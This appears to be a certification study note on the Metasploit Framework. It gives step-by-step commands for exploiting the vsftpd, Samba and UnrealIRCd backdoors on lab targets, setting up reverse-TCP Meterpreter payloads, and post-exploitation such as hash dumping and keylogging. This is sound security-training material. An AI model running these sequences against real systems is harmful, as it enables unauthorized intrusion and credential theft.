# Metasploit for System Hacking

> **Module:** CEH v13 – Module 06 (System Hacking)
>
> **Tool:** Metasploit Framework (MSF)
>
> **Objective:** Learn how to use Metasploit for exploitation, post-exploitation, and system hacking during authorized penetration tests.

---

# What is Metasploit?

Metasploit Framework (MSF) is one of the world's most widely used penetration testing frameworks.

It provides:

- Exploits
- Payloads
- Encoders
- Auxiliary Modules
- Post-Exploitation Modules
- Scanners

Metasploit allows security professionals to automate exploitation and post-exploitation activities.

---

# Metasploit Workflow

```text
Information Gathering
        │
        ▼
Vulnerability Identification
        │
        ▼
Select Exploit
        │
        ▼
Configure Payload
        │
        ▼
Launch Exploit
        │
        ▼
Gain Shell
        │
        ▼
Post Exploitation
        │
        ▼
Privilege Escalation
        │
        ▼
Documentation
```

---

# Starting Metasploit

```bash
msfconsole
```

---

# Update Metasploit

```bash
msfupdate
```

---

# Basic Commands

| Command | Description |
|----------|-------------|
| help | Display help |
| search | Search modules |
| use | Load module |
| show options | Show module options |
| show payloads | List payloads |
| set | Set option |
| unset | Remove option |
| exploit | Launch exploit |
| run | Execute module |
| back | Exit module |
| exit | Quit Metasploit |

---

# Searching for Exploits

Example

```bash
search vsftpd
```

Search SMB exploits

```bash
search smb
```

Search Apache exploits

```bash
search apache
```

Search WordPress exploits

```bash
search wordpress
```

---

# Selecting an Exploit

Example

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

# Viewing Options

```bash
show options
```

Example

```
RHOSTS

RPORT

TARGET

PAYLOAD
```

---

# Setting Required Options

Target IP

```bash
set RHOSTS 192.168.1.100
```

Port

```bash
set RPORT 21
```

---

# Payloads

View Available Payloads

```bash
show payloads
```

Example Payload

```bash
set PAYLOAD cmd/unix/interact
```

Linux Meterpreter

```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

Windows Meterpreter

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

---

# Configure Listener

Local IP

```bash
set LHOST 192.168.1.10
```

Port

```bash
set LPORT 4444
```

---

# Launch Exploit

```bash
exploit
```

or

```bash
run
```

---

# Background Sessions

```bash
background
```

---

# List Sessions

```bash
sessions
```

---

# Interact with Session

```bash
sessions -i 1
```

---

# Kill Session

```bash
sessions -k 1
```

---

# Meterpreter Basics

Display Current User

```bash
getuid
```

Current Directory

```bash
pwd
```

Change Directory

```bash
cd
```

List Files

```bash
ls
```

Download File

```bash
download file.txt
```

Upload File

```bash
upload shell.php
```

System Information

```bash
sysinfo
```

Running Processes

```bash
ps
```

Migrate Process

```bash
migrate PID
```

Open Shell

```bash
shell
```

Exit

```bash
exit
```

---

# Meterpreter Post Exploitation

Hash Dump

```bash
hashdump
```

Screenshot

```bash
screenshot
```

Keylogger

```bash
keyscan_start
```

Dump Password Hashes

```bash
hashdump
```

Network Interfaces

```bash
ipconfig
```

Routing Table

```bash
route
```

---

# Auxiliary Modules

Port Scan

```bash
use auxiliary/scanner/portscan/tcp
```

SSH Login Scanner

```bash
use auxiliary/scanner/ssh/ssh_login
```

FTP Scanner

```bash
use auxiliary/scanner/ftp/ftp_version
```

SMB Scanner

```bash
use auxiliary/scanner/smb/smb_version
```

---

# Exploit Example

Search

```bash
search vsftpd
```

Use

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Configure

```bash
set RHOSTS TARGET
```

Run

```bash
exploit
```

---

# Exploit Example (Samba)

```bash
search samba
```

```bash
use exploit/linux/samba/is_known_pipename
```

```bash
set RHOSTS TARGET
```

```bash
exploit
```

---

# Metasploit Database

Initialize Database

```bash
msfdb init
```

Check Status

```bash
db_status
```

Import Nmap Scan

```bash
db_import scan.xml
```

List Hosts

```bash
hosts
```

List Services

```bash
services
```

List Vulnerabilities

```bash
vulns
```

---

# Nmap Integration

Run Scan

```bash
db_nmap -sV TARGET
```

---

# Common Payload Types

| Payload | Purpose |
|----------|----------|
| cmd/unix/interact | Unix Shell |
| linux/x86/meterpreter/reverse_tcp | Linux Meterpreter |
| windows/meterpreter/reverse_tcp | Windows Meterpreter |
| php/meterpreter/reverse_tcp | PHP Meterpreter |
| java/meterpreter/reverse_tcp | Java Meterpreter |

---

# Common Meterpreter Commands

| Command | Purpose |
|----------|----------|
| pwd | Current Directory |
| ls | List Files |
| cd | Change Directory |
| upload | Upload File |
| download | Download File |
| shell | Spawn Shell |
| sysinfo | System Information |
| ps | Running Processes |
| migrate | Process Migration |
| getuid | Current User |

---

# Real Lab Examples

## Metasploitable 2

Exploit VSFTPD

```bash
search vsftpd

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOSTS TARGET

exploit
```

---

## Samba Exploit

```bash
search samba

use exploit/linux/samba/is_known_pipename

set RHOSTS TARGET

exploit
```

---

## UnrealIRCd

```bash
search unreal

use exploit/unix/irc/unreal_ircd_3281_backdoor

set RHOSTS TARGET

exploit
```

---

# Best Practices

✔ Perform reconnaissance before exploitation.

✔ Verify vulnerabilities before launching exploits.

✔ Use the least intrusive payload appropriate for the assessment.

✔ Record every command and result for reporting.

✔ Clean up any artifacts created during authorized testing.

---

# Interview Questions

## What is Metasploit?

Metasploit is an open-source penetration testing framework used for vulnerability validation, exploitation, and post-exploitation.

---

## Difference between Exploit and Payload?

**Exploit** is the code that leverages a vulnerability.

**Payload** is the code executed after successful exploitation.

---

## Which command searches for exploits?

```bash
search
```

---

## Which command lists active sessions?

```bash
sessions
```

---

## Which command opens a Meterpreter session?

```bash
sessions -i <session_id>
```

---

## Which command shows available payloads?

```bash
show payloads
```

---

## Which command imports an Nmap XML scan?

```bash
db_import scan.xml
```

---

# CEH Exam Tips

✔ Understand the difference between exploits, payloads, auxiliary modules, and post modules.

✔ Know how to configure `RHOSTS`, `LHOST`, `RPORT`, and `LPORT`.

✔ Be familiar with basic Meterpreter commands.

✔ Practice importing Nmap scans and managing sessions.

✔ Always document findings and perform exploitation only with explicit authorization.

---

# Key Takeaways

- Metasploit is one of the most powerful frameworks for penetration testing and system hacking.
- It streamlines the exploitation lifecycle from reconnaissance to post-exploitation.
- Mastering module selection, payload configuration, and Meterpreter usage is essential for CEH, eJPT, PNPT, and OSCP preparation.

---

## Related Notes

- `01-System-Hacking-Workflow.md`
- `09-Meterpreter-Commands.md`
- `10-Privilege-Escalation-Windows.md`
- `11-Privilege-Escalation-Linux.md`
- `17-System-Hacking-Tools.md`
